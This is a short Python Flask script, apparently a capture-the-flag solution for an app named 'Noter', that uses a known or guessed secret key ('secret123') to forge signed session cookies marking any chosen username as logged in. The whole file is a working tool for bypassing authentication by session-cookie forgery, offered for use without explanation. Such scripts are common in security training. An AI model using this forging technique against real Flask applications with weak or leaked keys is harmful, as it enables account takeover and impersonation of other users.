from flask import Flask, make_response, session
from flask.sessions import SecureCookieSessionInterface

app = Flask("Noter")
app.secret_key = "secret123"

session_serializer = SecureCookieSessionInterface() \
                        .get_signing_serializer(app)

@app.route('/<username>')
def generateCookie(username):
    session["logged_in"] = True
    session["username"] = username

    session_cookie = session_serializer.dumps(dict(session))
    return session_cookie

app.run()
